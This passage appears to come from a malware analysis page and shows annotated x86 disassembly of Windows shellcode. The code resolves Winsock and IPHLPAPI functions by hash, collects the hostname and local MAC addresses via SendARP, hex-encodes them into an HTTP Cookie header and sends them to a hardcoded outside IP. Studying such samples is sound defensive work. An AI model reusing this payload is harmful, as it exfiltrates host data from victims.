class="hljs-number"><span class="hljs-number">0000007</span></span>D <span class="hljs-number"><span class="hljs-number">89442424</span></span> mov [esp+<span class="hljs-number"><span class="hljs-number">0x24</span></span>],eax <span class="hljs-number"><span class="hljs-number">00000081</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span>B pop ebx <span class="hljs-number"><span class="hljs-number">00000082</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span>B pop ebx <span class="hljs-number"><span class="hljs-number">00000083</span></span> <span class="hljs-number"><span class="hljs-number">61</span></span> popa <span class="hljs-number"><span class="hljs-number">00000084</span></span> <span class="hljs-number"><span class="hljs-number">59</span></span> pop ecx <span class="hljs-number"><span class="hljs-number">00000085</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span>A pop edx <span class="hljs-number"><span class="hljs-number">00000086</span></span> <span class="hljs-number"><span class="hljs-number">51</span></span> push ecx <span class="hljs-number"><span class="hljs-number">00000087</span></span> FFE0 jmp eax <span class="hljs-number"><span class="hljs-number">00000089</span></span> <span class="hljs-number"><span class="hljs-number">58</span></span> pop eax <span class="hljs-number"><span class="hljs-number">0000008</span></span>A <span class="hljs-number"><span class="hljs-number">5</span></span>F pop edi <span class="hljs-number"><span class="hljs-number">0000008</span></span>B <span class="hljs-number"><span class="hljs-number">5</span></span>A pop edx <span class="hljs-number"><span class="hljs-number">0000008</span></span>C <span class="hljs-number"><span class="hljs-number">8</span></span>B12 mov edx,[edx] <span class="hljs-number"><span class="hljs-number">0000008</span></span>E EB86 jmp short <span class="hljs-number"><span class="hljs-number">0x16</span></span> <span class="hljs-number"><span class="hljs-number">00000090</span></span> skipping <span class="hljs-number"><span class="hljs-number">0x1</span></span> bytes <span class="hljs-number"><span class="hljs-number">00000091</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span>D pop ebp <span class="hljs-number"><span class="hljs-number">00000092</span></span> <span class="hljs-number"><span class="hljs-number">81</span></span>BDE90200004745 cmp dword [ebp+<span class="hljs-number"><span class="hljs-number">0x2e9</span></span>],<span class="hljs-number"><span class="hljs-number">0x20544547</span></span> # "GET " <span class="hljs-number"><span class="hljs-number">-5420</span></span> <span class="hljs-number"><span class="hljs-number">0000009</span></span>C <span class="hljs-number"><span class="hljs-number">7570</span></span> jnz <span class="hljs-number"><span class="hljs-number">0x10e</span></span> <span class="hljs-number"><span class="hljs-number">0000009</span></span>E <span class="hljs-number"><span class="hljs-number">8</span></span>D85D1020000 lea eax,[ebp+<span class="hljs-number"><span class="hljs-number">0x2d1</span></span>] "ws2_32" <span class="hljs-number"><span class="hljs-number">000000</span></span>A4 <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000000</span></span>A5 <span class="hljs-number"><span class="hljs-number">684</span></span>C772607 push dword <span class="hljs-number"><span class="hljs-number">0x726774c</span></span> # LoadLibraryA <span class="hljs-number"><span class="hljs-number">000000</span></span>AA FFD5 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ebp <span class="hljs-number"><span class="hljs-number">000000</span></span>AC <span class="hljs-number"><span class="hljs-number">85</span></span>C0 test eax,eax <span class="hljs-number"><span class="hljs-number">000000</span></span>AE <span class="hljs-number"><span class="hljs-number">745</span></span>E jz <span class="hljs-number"><span class="hljs-number">0x10e</span></span> <span class="hljs-number"><span class="hljs-number">000000</span></span>B0 <span class="hljs-number"><span class="hljs-number">8</span></span>D85D8020000 lea eax,[ebp+<span class="hljs-number"><span class="hljs-number">0x2d8</span></span>] "IPHLPAPI" <span class="hljs-number"><span class="hljs-number">000000</span></span>B6 <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000000</span></span>B7 <span class="hljs-number"><span class="hljs-number">684</span></span>C772607 push dword <span class="hljs-number"><span class="hljs-number">0x726774c</span></span> # LoadLibraryA <span class="hljs-number"><span class="hljs-number">000000</span></span>BC FFD5 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ebp # ebp = find <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> <span class="hljs-number"><span class="hljs-number">000000</span></span>BE <span class="hljs-number"><span class="hljs-number">85</span></span>C0 test eax,eax <span class="hljs-number"><span class="hljs-number">000000</span></span>C0 <span class="hljs-number"><span class="hljs-number">744</span></span>C jz <span class="hljs-number"><span class="hljs-number">0x10e</span></span> <span class="hljs-number"><span class="hljs-number">000000</span></span>C2 BB90010000 mov ebx,<span class="hljs-number"><span class="hljs-number">0x190</span></span> <span class="hljs-number"><span class="hljs-number">000000</span></span>C7 <span class="hljs-number"><span class="hljs-number">29</span></span>DC sub esp,ebx <span class="hljs-number"><span class="hljs-number">000000</span></span>C9 <span class="hljs-number"><span class="hljs-number">54</span></span> push esp <span class="hljs-number"><span class="hljs-number">000000</span></span>CA <span class="hljs-number"><span class="hljs-number">53</span></span> push ebx <span class="hljs-number"><span class="hljs-number">000000</span></span>CB <span class="hljs-number"><span class="hljs-number">6829806</span></span>B00 push dword <span class="hljs-number"><span class="hljs-number">0x6b8029</span></span> # WSAStartupA <span class="hljs-number"><span class="hljs-number">000000</span></span>D0 FFD5 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ebp <span class="hljs-number"><span class="hljs-number">000000</span></span>D2 <span class="hljs-number"><span class="hljs-number">01</span></span>DC <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> esp,ebx <span class="hljs-number"><span class="hljs-number">000000</span></span>D4 <span class="hljs-number"><span class="hljs-number">85</span></span>C0 test eax,eax <span class="hljs-number"><span class="hljs-number">000000</span></span>D6 <span class="hljs-number"><span class="hljs-number">7536</span></span> jnz <span class="hljs-number"><span class="hljs-number">0x10e</span></span> <span class="hljs-number"><span class="hljs-number">000000</span></span>D8 <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000000</span></span>D9 <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000000</span></span>DA <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000000</span></span>DB <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000000</span></span>DC <span class="hljs-number"><span class="hljs-number">40</span></span> inc eax <span class="hljs-number"><span class="hljs-number">000000</span></span>DD <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000000</span></span>DE <span class="hljs-number"><span class="hljs-number">40</span></span> inc eax <span class="hljs-number"><span class="hljs-number">000000</span></span>DF <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000000E0</span></span> <span class="hljs-number"><span class="hljs-number">68</span></span>EA0FDFE0 push dword <span class="hljs-number"><span class="hljs-number">0xe0df0fea</span></span> # WSASocketA <span class="hljs-number"><span class="hljs-number">000000E5</span></span> FFD5 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ebp <span class="hljs-number"><span class="hljs-number">000000E7</span></span> <span class="hljs-number"><span class="hljs-number">31</span></span>DB xor ebx,ebx <span class="hljs-number"><span class="hljs-number">000000E9</span></span> F7D3 <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> ebx <span class="hljs-number"><span class="hljs-number">000000</span></span>EB <span class="hljs-number"><span class="hljs-number">39</span></span>C3 cmp ebx,eax <span class="hljs-number"><span class="hljs-number">000000</span></span>ED <span class="hljs-number"><span class="hljs-number">741</span></span>F jz <span class="hljs-number"><span class="hljs-number">0x10e</span></span> <span class="hljs-number"><span class="hljs-number">000000</span></span>EF <span class="hljs-number"><span class="hljs-number">89</span></span>C3 mov ebx,eax <span class="hljs-number"><span class="hljs-number">000000</span></span>F1 <span class="hljs-number"><span class="hljs-number">6</span></span>A10 push byte +<span class="hljs-number"><span class="hljs-number">0x10</span></span> <span class="hljs-number"><span class="hljs-number">000000</span></span>F3 <span class="hljs-number"><span class="hljs-number">8</span></span>DB5E1020000 lea esi,[ebp+<span class="hljs-number"><span class="hljs-number">0x2e1</span></span>] # struct sockaddr_in { AF_INET, <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-number"><span class="hljs-number">65.222</span></span><span class="hljs-number"><span class="hljs-number">.202</span></span><span class="hljs-number"><span class="hljs-number">.54</span></span> } <span class="hljs-number"><span class="hljs-number">000000</span></span>F9 <span class="hljs-number"><span class="hljs-number">56</span></span> push esi <span class="hljs-number"><span class="hljs-number">000000</span></span>FA <span class="hljs-number"><span class="hljs-number">53</span></span> push ebx <span class="hljs-number"><span class="hljs-number">000000</span></span>FB <span class="hljs-number"><span class="hljs-number">6899</span></span>A57461 push dword <span class="hljs-number"><span class="hljs-number">0x6174a599</span></span> # <span class="hljs-keyword"><span class="hljs-keyword">connect</span></span> <span class="hljs-number"><span class="hljs-number">00000100</span></span> FFD5 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ebp <span class="hljs-number"><span class="hljs-number">00000102</span></span> <span class="hljs-number"><span class="hljs-number">85</span></span>C0 test eax,eax <span class="hljs-number"><span class="hljs-number">00000104</span></span> <span class="hljs-number"><span class="hljs-number">741</span></span>F jz <span class="hljs-number"><span class="hljs-number">0x125</span></span> <span class="hljs-number"><span class="hljs-number">00000106</span></span> FE8D89000000 <span class="hljs-type"><span class="hljs-type">dec</span></span> byte [ebp+<span class="hljs-number"><span class="hljs-number">0x89</span></span>] # Try <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">connect</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span> times <span class="hljs-number"><span class="hljs-number">0000010</span></span>C <span class="hljs-number"><span class="hljs-number">75E3</span></span> jnz <span class="hljs-number"><span class="hljs-number">0xf1</span></span> <span class="hljs-number"><span class="hljs-number">0000010</span></span>E <span class="hljs-number"><span class="hljs-number">80</span></span>BD4F02000001 cmp byte [ebp+<span class="hljs-number"><span class="hljs-number">0x24f</span></span>],<span class="hljs-number"><span class="hljs-number">0x1</span></span> <span class="hljs-number"><span class="hljs-number">00000115</span></span> <span class="hljs-number"><span class="hljs-number">7407</span></span> jz <span class="hljs-number"><span class="hljs-number">0x11e</span></span> <span class="hljs-number"><span class="hljs-number">00000117</span></span> E83B010000 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> <span class="hljs-number"><span class="hljs-number">0x257</span></span> <span class="hljs-number"><span class="hljs-number">0000011</span></span>C EB05 jmp short <span class="hljs-number"><span class="hljs-number">0x123</span></span> <span class="hljs-number"><span class="hljs-number">0000011</span></span>E E84D010000 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> <span class="hljs-number"><span class="hljs-number">0x270</span></span> <span class="hljs-number"><span class="hljs-number">00000123</span></span> FFE7 jmp edi <span class="hljs-number"><span class="hljs-number">00000125</span></span> B800010000 mov eax,<span class="hljs-number"><span class="hljs-number">0x100</span></span> <span class="hljs-number"><span class="hljs-number">0000012</span></span>A <span class="hljs-number"><span class="hljs-number">29</span></span>C4 sub esp,eax <span class="hljs-number"><span class="hljs-number">0000012</span></span>C <span class="hljs-number"><span class="hljs-number">89E2</span></span> mov edx,esp <span class="hljs-number"><span class="hljs-number">0000012</span></span>E <span class="hljs-number"><span class="hljs-number">52</span></span> push edx <span class="hljs-number"><span class="hljs-number">0000012</span></span>F <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">00000130</span></span> <span class="hljs-number"><span class="hljs-number">52</span></span> push edx <span class="hljs-number"><span class="hljs-number">00000131</span></span> <span class="hljs-number"><span class="hljs-number">68</span></span>B649DE01 push dword <span class="hljs-number"><span class="hljs-number">0x1de49b6</span></span> # gethostname <span class="hljs-number"><span class="hljs-number">00000136</span></span> FFD5 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ebp <span class="hljs-number"><span class="hljs-number">00000138</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span>F pop edi <span class="hljs-number"><span class="hljs-number">00000139</span></span> <span class="hljs-number"><span class="hljs-number">81</span></span>C400010000 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> esp,<span class="hljs-number"><span class="hljs-number">0x100</span></span> <span class="hljs-number"><span class="hljs-number">0000013</span></span>F <span class="hljs-number"><span class="hljs-number">85</span></span>C0 test eax,eax <span class="hljs-number"><span class="hljs-number">00000141</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>F85F2000000 jnz near <span class="hljs-number"><span class="hljs-number">0x239</span></span> <span class="hljs-number"><span class="hljs-number">00000147</span></span> <span class="hljs-number"><span class="hljs-number">57</span></span> push edi <span class="hljs-number"><span class="hljs-number">00000148</span></span> E8F9000000 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> <span class="hljs-number"><span class="hljs-number">0x246</span></span> # strlen <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> gethostname <span class="hljs-number"><span class="hljs-number">0000014</span></span>D <span class="hljs-number"><span class="hljs-number">5</span></span>E pop esi <span class="hljs-number"><span class="hljs-number">0000014</span></span>E <span class="hljs-number"><span class="hljs-number">89</span></span>CA mov edx,ecx <span class="hljs-number"><span class="hljs-number">00000150</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>DBDE9020000 lea edi,[ebp+<span class="hljs-number"><span class="hljs-number">0x2e9</span></span>] <span class="hljs-number"><span class="hljs-number">00000156</span></span> E8EB000000 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> <span class="hljs-number"><span class="hljs-number">0x246</span></span> # strlen (<span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">move</span></span> EDI <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span> byte at the <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> the HTTP string) <span class="hljs-number"><span class="hljs-number">0000015</span></span>B <span class="hljs-number"><span class="hljs-number">4</span></span>F <span class="hljs-type"><span class="hljs-type">dec</span></span> edi <span class="hljs-number"><span class="hljs-number">0000015</span></span>C <span class="hljs-number"><span class="hljs-number">83</span></span>FA20 cmp edx,byte +<span class="hljs-number"><span class="hljs-number">0x20</span></span> <span class="hljs-number"><span class="hljs-number">0000015</span></span>F <span class="hljs-number"><span class="hljs-number">7</span></span>C05 jl <span class="hljs-number"><span class="hljs-number">0x166</span></span> <span class="hljs-number"><span class="hljs-number">00000161</span></span> BA20000000 mov edx,<span class="hljs-number"><span class="hljs-number">0x20</span></span> <span class="hljs-number"><span class="hljs-number">00000166</span></span> <span class="hljs-number"><span class="hljs-number">89</span></span>D1 mov ecx,edx <span class="hljs-number"><span class="hljs-number">00000168</span></span> <span class="hljs-number"><span class="hljs-number">56</span></span> push esi <span class="hljs-number"><span class="hljs-number">00000169</span></span> F3A4 rep movsb <span class="hljs-number"><span class="hljs-number">0000016</span></span>B B90D000000 mov ecx,<span class="hljs-number"><span class="hljs-number">0xd</span></span> <span class="hljs-number"><span class="hljs-number">00000170</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>DB5C4020000 lea esi,[ebp+<span class="hljs-number"><span class="hljs-number">0x2c4</span></span>] "\r\nCookie: ID=" <span class="hljs-number"><span class="hljs-number">00000176</span></span> F3A4 rep movsb <span class="hljs-number"><span class="hljs-number">00000178</span></span> <span class="hljs-number"><span class="hljs-number">89</span></span>BD4B020000 mov [ebp+<span class="hljs-number"><span class="hljs-number">0x24b</span></span>],edi <span class="hljs-number"><span class="hljs-number">0000017</span></span>E <span class="hljs-number"><span class="hljs-number">5</span></span>E pop esi <span class="hljs-number"><span class="hljs-number">0000017</span></span>F <span class="hljs-number"><span class="hljs-number">56</span></span> push esi <span class="hljs-number"><span class="hljs-number">00000180</span></span> <span class="hljs-number"><span class="hljs-number">68</span></span>A9283480 push dword <span class="hljs-number"><span class="hljs-number">0x803428a9</span></span> # gethostbyname <span class="hljs-number"><span class="hljs-number">00000185</span></span> FFD5 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ebp <span class="hljs-number"><span class="hljs-number">00000187</span></span> <span class="hljs-number"><span class="hljs-number">85</span></span>C0 test eax,eax <span class="hljs-number"><span class="hljs-number">00000189</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>F84AA000000 jz near <span class="hljs-number"><span class="hljs-number">0x239</span></span> <span class="hljs-number"><span class="hljs-number">0000018</span></span>F <span class="hljs-number"><span class="hljs-number">668</span></span>B480A mov cx,[eax+<span class="hljs-number"><span class="hljs-number">0xa</span></span>] <span class="hljs-number"><span class="hljs-number">00000193</span></span> <span class="hljs-number"><span class="hljs-number">6683</span></span>F904 cmp cx,byte +<span class="hljs-number"><span class="hljs-number">0x4</span></span> <span class="hljs-number"><span class="hljs-number">00000197</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>F829C000000 jc near <span class="hljs-number"><span class="hljs-number">0x239</span></span> <span class="hljs-number"><span class="hljs-number">0000019</span></span>D <span class="hljs-number"><span class="hljs-number">8</span></span>D400C lea eax,[eax+<span class="hljs-number"><span class="hljs-number">0xc</span></span>] <span class="hljs-number"><span class="hljs-number">000001</span></span>A0 <span class="hljs-number"><span class="hljs-number">8</span></span>B00 mov eax,[eax] <span class="hljs-number"><span class="hljs-number">000001</span></span>A2 <span class="hljs-number"><span class="hljs-number">8</span></span>B08 mov ecx,[eax] <span class="hljs-number"><span class="hljs-number">000001</span></span>A4 <span class="hljs-number"><span class="hljs-number">8</span></span>B09 mov ecx,[ecx] <span class="hljs-number"><span class="hljs-number">000001</span></span>A6 B800010000 mov eax,<span class="hljs-number"><span class="hljs-number">0x100</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>AB <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000001</span></span>AC <span class="hljs-number"><span class="hljs-number">89E7</span></span> mov edi,esp <span class="hljs-number"><span class="hljs-number">000001</span></span>AE <span class="hljs-number"><span class="hljs-number">29</span></span>C4 sub esp,eax <span class="hljs-number"><span class="hljs-number">000001</span></span>B0 <span class="hljs-number"><span class="hljs-number">89E6</span></span> mov esi,esp <span class="hljs-number"><span class="hljs-number">000001</span></span>B2 <span class="hljs-number"><span class="hljs-number">57</span></span> push edi <span class="hljs-number"><span class="hljs-number">000001</span></span>B3 <span class="hljs-number"><span class="hljs-number">56</span></span> push esi <span class="hljs-number"><span class="hljs-number">000001</span></span>B4 <span class="hljs-number"><span class="hljs-number">51</span></span> push ecx <span class="hljs-number"><span class="hljs-number">000001</span></span>B5 <span class="hljs-number"><span class="hljs-number">51</span></span> push ecx <span class="hljs-number"><span class="hljs-number">000001</span></span>B6 <span class="hljs-number"><span class="hljs-number">684872</span></span>D2B8 push dword <span class="hljs-number"><span class="hljs-number">0xb8d27248</span></span> # iphlpapi.dll!SendARP <span class="hljs-number"><span class="hljs-number">000001</span></span>BB FFD5 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ebp <span class="hljs-number"><span class="hljs-number">000001</span></span>BD <span class="hljs-number"><span class="hljs-number">85</span></span>C0 test eax,eax <span class="hljs-number"><span class="hljs-number">000001</span></span>BF <span class="hljs-number"><span class="hljs-number">81</span></span>C404010000 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> esp,<span class="hljs-number"><span class="hljs-number">0x104</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>C5 <span class="hljs-number"><span class="hljs-number">0</span></span>FB70F movzx ecx,word [edi] <span class="hljs-number"><span class="hljs-number">000001</span></span>C8 <span class="hljs-number"><span class="hljs-number">83</span></span>F906 cmp ecx,byte +<span class="hljs-number"><span class="hljs-number">0x6</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>CB <span class="hljs-number"><span class="hljs-number">726</span></span>C jc <span class="hljs-number"><span class="hljs-number">0x239</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>CD B906000000 mov ecx,<span class="hljs-number"><span class="hljs-number">0x6</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>D2 B810000000 mov eax,<span class="hljs-number"><span class="hljs-number">0x10</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>D7 <span class="hljs-number"><span class="hljs-number">29</span></span>C4 sub esp,eax <span class="hljs-number"><span class="hljs-number">000001</span></span>D9 <span class="hljs-number"><span class="hljs-number">89E7</span></span> mov edi,esp <span class="hljs-number"><span class="hljs-number">000001</span></span>DB <span class="hljs-number"><span class="hljs-number">89</span></span>CA mov edx,ecx <span class="hljs-number"><span class="hljs-number">000001</span></span>DD D1E2 shl edx,<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>DF <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000001E0</span></span> <span class="hljs-number"><span class="hljs-number">52</span></span> push edx <span class="hljs-number"><span class="hljs-number">000001E1</span></span> <span class="hljs-number"><span class="hljs-number">31</span></span>D2 xor edx,edx <span class="hljs-number"><span class="hljs-number">000001E3</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>A16 mov dl,[esi] <span class="hljs-number"><span class="hljs-number">000001E5</span></span> <span class="hljs-number"><span class="hljs-number">88</span></span>D0 mov al,dl <span class="hljs-number"><span class="hljs-number">000001E7</span></span> <span class="hljs-number"><span class="hljs-number">24</span></span>F0 <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> al,<span class="hljs-number"><span class="hljs-number">0xf0</span></span> # It actually turns the raw data <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> hex strings <span class="hljs-keyword"><span class="hljs-keyword">before</span></span> appending it <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> the HTTP <span class="hljs-keyword"><span class="hljs-keyword">header</span></span> <span class="hljs-number"><span class="hljs-number">000001E9</span></span> C0E804 shr al,<span class="hljs-number"><span class="hljs-number">0x4</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>EC <span class="hljs-number"><span class="hljs-number">3</span></span>C09 cmp al,<span class="hljs-number"><span class="hljs-number">0x9</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>EE <span class="hljs-number"><span class="hljs-number">7704</span></span> ja <span class="hljs-number"><span class="hljs-number">0x1f4</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>F0 <span class="hljs-number"><span class="hljs-number">0430</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> al,<span class="hljs-number"><span class="hljs-number">0x30</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>F2 EB02 jmp short <span class="hljs-number"><span class="hljs-number">0x1f6</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>F4 <span class="hljs-number"><span class="hljs-number">0437</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> al,<span class="hljs-number"><span class="hljs-number">0x37</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>F6 <span class="hljs-number"><span class="hljs-number">8807</span></span> mov [edi],al <span class="hljs-number"><span class="hljs-number">000001</span></span>F8 <span class="hljs-number"><span class="hljs-number">47</span></span> inc edi <span class="hljs-number"><span class="hljs-number">000001</span></span>F9 <span class="hljs-number"><span class="hljs-number">88</span></span>D0 mov al,dl <span class="hljs-number"><span class="hljs-number">000001</span></span>FB <span class="hljs-number"><span class="hljs-number">240</span></span>F <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> al,<span class="hljs-number"><span class="hljs-number">0xf</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>FD <span class="hljs-number"><span class="hljs-number">3</span></span>C09 cmp al,<span class="hljs-number"><span class="hljs-number">0x9</span></span> <span class="hljs-number"><span class="hljs-number">000001</span></span>FF <span class="hljs-number"><span class="hljs-number">7704</span></span> ja <span class="hljs-number"><span class="hljs-number">0x205</span></span> <span class="hljs-number"><span class="hljs-number">00000201</span></span> <span class="hljs-number"><span class="hljs-number">0430</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> al,<span class="hljs-number"><span class="hljs-number">0x30</span></span> <span class="hljs-number"><span class="hljs-number">00000203</span></span> EB02 jmp short <span class="hljs-number"><span class="hljs-number">0x207</span></span> <span class="hljs-number"><span class="hljs-number">00000205</span></span> <span class="hljs-number"><span class="hljs-number">0437</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> al,<span class="hljs-number"><span class="hljs-number">0x37</span></span> <span class="hljs-number"><span class="hljs-number">00000207</span></span> <span class="hljs-number"><span class="hljs-number">8807</span></span> mov [edi],al <span class="hljs-number"><span class="hljs-number">00000209</span></span> <span class="hljs-number"><span class="hljs-number">47</span></span> inc edi <span class="hljs-number"><span class="hljs-number">0000020</span></span>A <span class="hljs-number"><span class="hljs-number">46</span></span> inc esi <span class="hljs-number"><span class="hljs-number">0000020</span></span>B E2D4 <span class="hljs-keyword"><span class="hljs-keyword">loop</span></span> <span class="hljs-number"><span class="hljs-number">0x1e1</span></span> <span class="hljs-number"><span class="hljs-number">0000020</span></span>D <span class="hljs-number"><span class="hljs-number">59</span></span> pop ecx <span class="hljs-number"><span class="hljs-number">0000020</span></span>E <span class="hljs-number"><span class="hljs-number">29</span></span>CF sub edi,ecx <span class="hljs-number"><span class="hljs-number">00000210</span></span> <span class="hljs-number"><span class="hljs-number">89</span></span>FE mov esi,edi <span class="hljs-number"><span class="hljs-number">00000212</span></span> <span class="hljs-number"><span class="hljs-number">58</span></span> pop eax <span class="hljs-number"><span class="hljs-number">00000213</span></span> <span class="hljs-number"><span class="hljs-number">01</span></span>C4 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> esp,eax <span class="hljs-number"><span class="hljs-number">00000215</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>BBD4B020000 mov edi,[ebp+<span class="hljs-number"><span class="hljs-number">0x24b</span></span>] <span class="hljs-number"><span class="hljs-number">0000021</span></span>B F3A4 rep movsb <span class="hljs-number"><span class="hljs-number">0000021</span></span>D C6854F02000001 mov byte [ebp+<span class="hljs-number"><span class="hljs-number">0x24f</span></span>],<span class="hljs-number"><span class="hljs-number">0x1</span></span> <span class="hljs-number"><span class="hljs-number">00000224</span></span> E82E000000 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> <span class="hljs-number"><span class="hljs-number">0x257</span></span> # Append "Connection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n" <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> the <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> strlen(ebp + <span class="hljs-number"><span class="hljs-number">0x2e9</span></span>) <span class="hljs-number"><span class="hljs-number">00000229</span></span> <span class="hljs-number"><span class="hljs-number">31</span></span>C0 xor eax,eax <span class="hljs-number"><span class="hljs-number">0000022</span></span>B <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">0000022</span></span>C <span class="hljs-number"><span class="hljs-number">51</span></span> push ecx <span class="hljs-number"><span class="hljs-number">0000022</span></span>D <span class="hljs-number"><span class="hljs-number">29</span></span>CF sub edi,ecx <span class="hljs-number"><span class="hljs-number">0000022</span></span>F <span class="hljs-number"><span class="hljs-number">4</span></span>F <span class="hljs-type"><span class="hljs-type">dec</span></span> edi <span class="hljs-number"><span class="hljs-number">00000230</span></span> <span class="hljs-number"><span class="hljs-number">57</span></span> push edi <span class="hljs-number"><span class="hljs-number">00000231</span></span> <span class="hljs-number"><span class="hljs-number">53</span></span> push ebx <span class="hljs-number"><span class="hljs-number">00000232</span></span> <span class="hljs-number"><span class="hljs-number">68</span></span>C2EB385F push dword <span class="hljs-number"><span class="hljs-number">0x5f38ebc2</span></span> # send <span class="hljs-number"><span class="hljs-number">00000237</span></span> FFD5 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ebp <span class="hljs-number"><span class="hljs-number">00000239</span></span> <span class="hljs-number"><span class="hljs-number">53</span></span> push ebx <span class="hljs-number"><span class="hljs-number">0000023</span></span>A <span class="hljs-number"><span class="hljs-number">68756E4</span></span>D61 push dword <span class="hljs-number"><span class="hljs-number">0x614d6e75</span></span> # closesocket <span class="hljs-number"><span class="hljs-number">0000023</span></span>F FFD5 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ebp <span class="hljs-number"><span class="hljs-number">00000241</span></span> E9C8FEFFFF jmp <span class="hljs-number"><span class="hljs-number">0x10e</span></span> <span class="hljs-number"><span class="hljs-number">00000246</span></span> <span class="hljs-number"><span class="hljs-number">31</span></span>C9 xor ecx,ecx <span class="hljs-number"><span class="hljs-number">00000248</span></span> F7D1 <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> ecx <span class="hljs-number"><span class="hljs-number">0000024</span></span>A <span class="hljs-number"><span class="hljs-number">31</span></span>C0 xor eax,eax <span class="hljs-number"><span class="hljs-number">0000024</span></span>C F2AE repne scasb <span class="hljs-number"><span class="hljs-number">0000024</span></span>E F7D1 <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> ecx <span class="hljs-number"><span class="hljs-number">00000250</span></span> <span class="hljs-number"><span class="hljs-number">49</span></span> <span class="hljs-type"><span class="hljs-type">dec</span></span> ecx <span class="hljs-number"><span class="hljs-number">00000251</span></span> C3 ret <span class="hljs-number"><span class="hljs-number">00000252</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000254</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000256</span></span> skipping <span class="hljs-number"><span 